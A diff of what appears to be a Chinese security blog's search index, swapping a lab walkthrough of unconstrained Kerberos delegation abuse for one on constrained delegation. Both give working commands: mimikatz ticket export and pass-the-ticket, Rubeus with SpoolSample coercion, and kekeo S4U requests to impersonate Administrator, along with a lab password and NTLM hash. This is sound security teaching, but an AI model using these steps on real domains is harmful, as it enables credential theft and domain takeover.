@@ -245,141 +245,196 @@
       </tags>
   </entry>
   <entry>
-    <title>非约束委派的原理及利用</title>
-    <url>/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先需要了解什么是委派？</p>
-<p>委派一般出现在域环境当中，域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
-<p>说得再通俗一点就是，假设有三个对象</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316150047630.png" class title="image-20220316150047630">
+    <title>约束委派的原理及利用</title>
+    <url>/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>非约束性委派被委派的机器会直接得到发布委派的用户的TGT，是十分不安全的，因此微软推出了约束性委派，添加了s4u2self与s4u2proxy协议，以增加安全性。假设有这么一种情况，用户A委派service1去访问service2,那么大概的访问过程如下：</p>
+<p>1、用户A访问service1。</p>
+<p>2、service1通过s4u2self协议代表用户A去请求一个可以访问service1自身的可转发的ticket，这个ticket代表域控授权service1可以以用户A的身份进行操作。</p>
+<p>3、service1以用户A的身份访问KDC通过s4u2proxy协议请求一个访问service2的可转发的ticket。</p>
+<p>4、service1获取到ticket并以用户A的名义访问service2。</p>
+<p>整个约束委派涉及到两个ticket票据，其实在我看来和kerbores的认证过程有异曲同工之妙，第一个ticket是证明service1可以代表用户A，第二个ticket代表service1可以代替用户A访问service2，只有kdc里面的tgs可以颁发ticket，所以这两个ticket都是由域控来授权的。</p>
+<p>还是用上一篇博客引用的图片来解释一下</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316210130668.png" class title="image-20220316210130668">
 
-<p>当hostA作为用户，这个用户在访问服务B上的某一功能，而A访问B的这一功能的完成需要服务B向服务C上的专属于用户A的部分发起验证请求，如果A有访问权限，主机B就会代替主机A去访问主机C。也就是说主机A委派主机B上的服务代表自己向主机C上的服务发起请求。在域环境下就是域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
-<p>域委派主要分为两种，非约束委派和约束委派，还有一种基于资源的约束委派这里就不讨论了。</p>
-<h2 id="非约束委派的原理（Unconstrained-Delegation）"><a href="#非约束委派的原理（Unconstrained-Delegation）" class="headerlink" title="非约束委派的原理（Unconstrained Delegation）"></a>非约束委派的原理（Unconstrained Delegation）</h2><p>对于非约束性委派，服务账号可以获取被委派用户的 TGT ，并将 TGT 缓存到 LSASS 进程中，从而服务账号可使用该 TGT ，模拟用户访问任意服务。那么非委派约束的攻击怎么产生的呢，就是诱导域管账号访问我们的被配置了非约束委派的主机，认证方式无论是kerberos还是ntlm都可以，这样子我们就拥有了域管的TGT，可以生成黄金票据。所以，非约束委派的主要目的就是获取域管账号的TGT，从而制作黄金票据。</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316145545395.png" class title="image-20220316145545395">
-
-<p>现在假设这么一种情形，service1配置了非约束性委派，用户A需要委派service1来访问service2。这个service1可以是主机账户。</p>
-<p>那么非约束性委派的过程可以大概理解为：</p>
-<p>1、用户A向KDC申请一张可转发的用户A自己的TGT与访问service1需要的ticket。<br>2、用户A将第一步得到的ticket与可转发的tgt与tgt中的session key一起发送给了service1。<br>3、service1使用那张tgt与session key来代表用户A行使后续操作例如访问service2。</p>
-<h1 id="非约束委派利用"><a href="#非约束委派利用" class="headerlink" title="非约束委派利用"></a>非约束委派利用</h1><h2 id="0x00部署环境"><a href="#0x00部署环境" class="headerlink" title="0x00部署环境"></a>0x00部署环境</h2><p>域控：192.168.93.30      主机名：DC</p>
-<p>域成员（配置了非约束性委派）：192.168.93.40   主机名：PC2  用户名：moretz</p>
-<p>域：whoamianony.org</p>
-<h2 id="0x01非约束委派配置及其特征"><a href="#0x01非约束委派配置及其特征" class="headerlink" title="0x01非约束委派配置及其特征"></a>0x01非约束委派配置及其特征</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">setspn -U -A <span class="title class_">MSSQLSvc</span>/mssql.<span class="property">whoamianony</span>.<span class="property">org</span>:<span class="number">1433</span> moretz</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230643559.png" class title="image-20220315230643559">
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230824870.png" class title="image-20220315230824870">
-
-<p>域控创建了一个域内可以委派的账户并注册spn后，勾选信任此用户作为任何服务的委派，此时这台moretz账号的主机就可以作为委派访问任意服务并且存储需要他进行委派访问的主机，比如A需要委派moretz主机访问C，那么moretz主机就会保存A的tgt</p>
-<p>当服务账号或者主机被设置为非约束性委派时，其 <strong>userAccountControl</strong> 属性会包含 <strong>TRUSTED_FOR_DELEGATION</strong>：</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230924720.png" class title="image-20220315230924720">
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231033106.png" class title="image-20220315231033106">
-
-<h2 id="0x02查找域内的非约束委派主机"><a href="#0x02查找域内的非约束委派主机" class="headerlink" title="0x02查找域内的非约束委派主机"></a>0x02查找域内的非约束委派主机</h2><h3 id="Idapsearch"><a href="#Idapsearch" class="headerlink" title="Idapsearch"></a>Idapsearch</h3><p>这是一款kali上自带的工具，适合在域外查询委派主机</p>
-<p>查找用户是否配置非约束委派</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
-
-<p>-w 参数后面跟的是moretz用户的密码</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231349030.png" class title="image-20220315231349030">
-
-<p>过滤条件是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><br></pre></td></tr></table></figure>
+<p>如果，hostB配置了约束委派，那么他就可以被任意用户A委派去访问hostC上特定的某一服务，比如cifs。与非约束委派的区别就是，限制了hostB可以访问的主机和此主机上的某个服务，但没有限制谁能对hostB发起委派请求。</p>
+<p>那么s4u2self与s4u2proxy协议是什么呢？</p>
+<p>s4u是对kerberos协议的一个拓展，s4u包含了两个子协议s4u2self和s4u2proxy，这两个协议都能向kdc发起票据请求。s4u2self是代表自己向kdc请求一个自己可以代表用户A的票据（ST），s4u2proxy是可以让service1以用户A的名义向kdc请求一个可以访问service2的票据。这两个票据有先后关系，service1必须先向kdc证明自己可以代表用户A（第一个票据），然后才能通过kdc的票据向service2发起请求（第二个票据）。一共向kdc发起了<strong>两次</strong>票据请求。</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316211012120.png" class title="image-20220316211012120">
 
 
 
-<p>查找配置为非约束委派的主机（域控的主机账号是默认开启非约束委派的）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+<h1 id="约束委派的利用"><a href="#约束委派的利用" class="headerlink" title="约束委派的利用"></a>约束委派的利用</h1><h2 id="0x00部署环境"><a href="#0x00部署环境" class="headerlink" title="0x00部署环境"></a>0x00部署环境</h2><p>域控    192.168.93.30   主机名DC</p>
+<p>域成员  192.168.93.40  主机名PC2   用户名moretz</p>
+<p>域控为域用户配置spn，为moretz用户配置约束委派，为DC机器的cifs服务做委派</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317095916068.png" class title="image-20220317095916068">
 
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231419152.png" class title="image-20220315231419152">
-
-<p>过滤条件是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><br></pre></td></tr></table></figure>
-
-<p>两条查询语句的不同点就在于过滤条件的不同samAccountType&#x3D;805306369时为主机，samAccountType&#x3D;805306368时为用户</p>
-<h3 id="ADfind"><a href="#ADfind" class="headerlink" title="ADfind"></a>ADfind</h3><p>有账号密码时</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 192.168.93.30 -u users\moretz -up Moretz2021 -b &quot;DC=w</span><br><span class="line">hoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.1</span><br><span class="line">13556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232118802.png" class title="image-20220315232118802">
-
-<p>域控默认为非约束委派</p>
-<p>查询当前域内的非约束委派用户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232256937.png" class title="image-20220315232256937">
-
-<p>可以看到这里的moretz用户就是非约束委派主机</p>
-<p>查询当前域内的非约束委派主机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232355641.png" class title="image-20220315232355641">
-
-<p>还是过滤条件的不同</p>
-<p>其他工具还有powerview，个人还是喜欢AdFind</p>
-<h3 id="0x03非约束委派利用"><a href="#0x03非约束委派利用" class="headerlink" title="0x03非约束委派利用"></a>0x03非约束委派利用</h3><p>现在只有moretz自己的票据</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232506026.png" class title="image-20220315232506026">
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317100047876.png" class title="image-20220317100047876">
 
 
 
-<p>若域内存在非约束委派机器，那么就可以使用域内我们想要获得票据的用户来登陆此非约束委派主机，从而在非约束委派主机中留下期望获得的主机票据的缓存</p>
-<p>这里先在域控主机（DC）上通过winrm连接域内的非委派主机（PC2）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enter-PSSession -ComputerName PC2</span><br></pre></td></tr></table></figure>
+<p>设置完成后</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317100354131.png" class title="image-20220317100354131">
 
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232601340.png" class title="image-20220315232601340">
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317102956972.png" class title="image-20220317102956972">
 
-<p>可以看到这里是成功连上了PC2，并且是administrator权限</p>
-<p>在ptt之前，是无法访问域控的</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232851871.png" class title="image-20220315232851871">
+<p>此时就配置完成了moretz（PC2）对DC的cifs的委派</p>
+<h2 id="0x01发现委派主机"><a href="#0x01发现委派主机" class="headerlink" title="0x01发现委派主机"></a>0x01发现委派主机</h2><h3 id="idapsearch"><a href="#idapsearch" class="headerlink" title="idapsearch"></a>idapsearch</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
 
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317101321257.png" class title="image-20220317101321257">
 
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
 
-<p>利用猕猴桃将域控的tgt导出来，因为域控连接过pc2，因此会有域控的tgt缓存</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge </span><br><span class="line">sekurlsa::tickets /exports</span><br></pre></td></tr></table></figure>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317103143976.png" class title="image-20220317103143976">
 
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316000914827.png" class title="image-20220316000914827">
+<h3 id="ADfind"><a href="#ADfind" class="headerlink" title="ADfind"></a>ADfind</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
 
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317102424078.png" class title="image-20220317102424078">
 
-
-<p>进行ptt（票据传递），生成tgt票据（<strong>这里获得的票据不能算作黄金票据，我们获得的权限只是域控的本地管理权限，不能连接域控，黄金票据的条件是缺一不可的，但是我们可以获取所有用户的hash，制作真正的黄金票据</strong>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt [0;291f51]-2-0-60a10000-Administrator@krbtgt-WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316000954582.png" class title="image-20220316000954582">
+<p>过滤条件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(samAccountType=805306368)(msds-allowedtodelegateto=*)</span><br></pre></td></tr></table></figure>
 
 
 
-<p>成功生成票据，接下来制作黄金票据的过程就不赘述了</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316001115188.png" class title="image-20220316001115188">
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317103023681.png" class title="image-20220317103023681">
+
+<p>过滤条件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(samAccountType=805306369)(msds-allowedtodelegateto=*)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02约束委派的攻击"><a href="#0x02约束委派的攻击" class="headerlink" title="0x02约束委派的攻击"></a>0x02约束委派的攻击</h2><h3 id="有明文密码或者ntml的条件下"><a href="#有明文密码或者ntml的条件下" class="headerlink" title="有明文密码或者ntml的条件下"></a>有明文密码或者ntml的条件下</h3><p>使用kekeo结合约束委派用户的明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:moretz /domain:whoamianony.org /password:Moretz2021</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317105105163.png" class title="image-20220317105105163">
 
 
 
+<p>使用ntml hash也可以</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317105506938.png" class title="image-20220317105506938">
 
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:moretz /domain:whoamianony.org /NTLM:抓到的hash值</span><br></pre></td></tr></table></figure>
 
-<p>除了直接在域控使用winrm，还可以利用非约束委派+spooler打印机服务强制指定的主机进行连接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rubeus.exe monitor /interval:1 filteruser:DC$ &gt; c:\users\hash.txt</span><br></pre></td></tr></table></figure>
-
-<p>使用rubues来监听本机连接的情况，设置监听间隔为一秒，监控对象为域控的主机名</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172630642.png" class title="image-20220316172630642">
-
-
-
-<p>运行spoolsample利用打印服务，强制让域控DC向域成员PC2验证身份，因为设置了rubeus监听，所以可以抓到TGS</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spoolsample.exe DC PC2</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172651602.png" class title="image-20220316172651602">
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172722495.png" class title="image-20220316172722495">
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172913745.png" class title="image-20220316172913745">
-
-<p>这里报错了，但是的确rubeus抓到了base64加密的tgt(hash.txt)</p>
-<p>这里用powershell解密base64，其他方法也可以，但是powershell可以直接将tgt文件保存下来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[IO.File]::WriteAllBytes(&quot;c:\users\moretz.whoamianony\tgt.kirbi&quot;, [Convert]::FromBase64String(&quot;得到的base64&quot;))</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316174513722.png" class title="image-20220316174513722">
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317105620181.png" class title="image-20220317105620181">
 
 
 
-<p>使用mimikatz导入票据后，跟之前一样也是个有域控本地管理员权限的，用mimikatz制作黄金票据后可以用psexec.exe反弹shell，不需要账号密码。（lsadump）</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316174621620.png" class title="image-20220316174621620">
+<p>使用这个tgt通过伪造s4u请求以administrator用户身份请求访问DC的cifs的ST</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_moretz@WHOAMIANONY.ORG_krbtgt~whoamianony.org@WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110301712.png" class title="image-20220317110301712">
+
+
+
+<p>使用获得的s4u2proxy的tgt进行ptt</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110416001.png" class title="image-20220317110416001">
+
+<p>在ptt之前不能访问DC的目录</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110502870.png" class title="image-20220317110502870">
+
+
+
+<p>使用mimikatz进行ptt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110852382.png" class title="image-20220317110852382">
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110914857.png" class title="image-20220317110914857">
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317111243140.png" class title="image-20220317111243140">
+
+<p>注：这里也不是黄金票据，制作黄金票据的条件是缺一不可的</p>
+<h3 id="无明文密码或hash的情况下直接从内存中导入票据"><a href="#无明文密码或hash的情况下直接从内存中导入票据" class="headerlink" title="无明文密码或hash的情况下直接从内存中导入票据"></a>无明文密码或hash的情况下直接从内存中导入票据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317111656366.png" class title="image-20220317111656366">
+
+
+
+<p>然后可以直接伪造s4u请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;17bae4]-2-0-60a10000-moretz@krbtgt-WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112009861.png" class title="image-20220317112009861">
+
+
+
+<p>现在是无法访问域控的</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112141194.png" class title="image-20220317112141194">
+
+<p>然后使用mimikatz进行ptt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112242012.png" class title="image-20220317112242012">
+
+
+
+<p>访问成功</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112612208.png" class title="image-20220317112612208">
+
+
+
+<p>上面是域服务用户存在约束委派，如果是域主机存在约束委派</p>
+<p>使用mimikatz抓取域主机PC2的ntml</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317133949487.png" class title="image-20220317133949487">
+
+
+
+<p>使用keko制作可以供PC2自己转发的tgt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:PC2$ /domain:whoamianony.org /NTLM:46d4391cec690c80efc906d2fdd594f8</span><br></pre></td></tr></table></figure>
+
